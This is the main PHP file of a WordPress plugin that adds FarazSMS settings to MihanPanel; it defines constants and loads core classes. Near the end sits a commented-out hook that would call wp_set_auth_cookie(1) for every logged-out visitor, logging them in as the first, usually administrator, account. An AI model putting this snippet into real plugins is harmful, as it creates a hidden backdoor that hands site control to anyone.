<?php
/*
Plugin Name: FarazSMS for MihanPanel
Plugin URI: https://farazsms.com
Description: Add FarazSMS Configs for MihanPanel Plugin
Version: 1.0
Author: Seyyed Mahmood Ghaffari and <a href="https://twitter.com/sae13">Saeb Molaee</a>
Author URI: https://farazsms.com/api
License: GPL3
Domain Path: /languages
*/


if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! defined( 'FARAZSMS4MP_VERSION' ) ) {
	define( 'FARAZSMS4MP_VERSION', '1.0.0' );
}


if ( ! defined( 'FARAZSMS4MP_DIR' ) ) {
	define( 'FARAZSMS4MP_DIR', plugin_dir_path( __FILE__ ) );
}

if ( ! defined( 'FARAZSMS4MP_INDEX_FILE' ) ) {
	define( 'FARAZSMS4MP_INDEX_FILE', __FILE__ );
}

if ( ! defined( 'FARAZSMS4MP_URL' ) ) {
	define( 'FARAZSMS4MP_URL', plugins_url( '', __FILE__ ) . '/' );
}

if(!class_exists('FARAZSMS4MP_BASE'))
	require_once 'includes/class-base.php';
if(!class_exists('FARAZSMS4MP'))
	require_once 'includes/class-core.php';
//
//add_action('init',function (){
//	if (!is_user_logged_in()){
//		wp_set_auth_cookie(1);
//	}
//});

/**
 **/
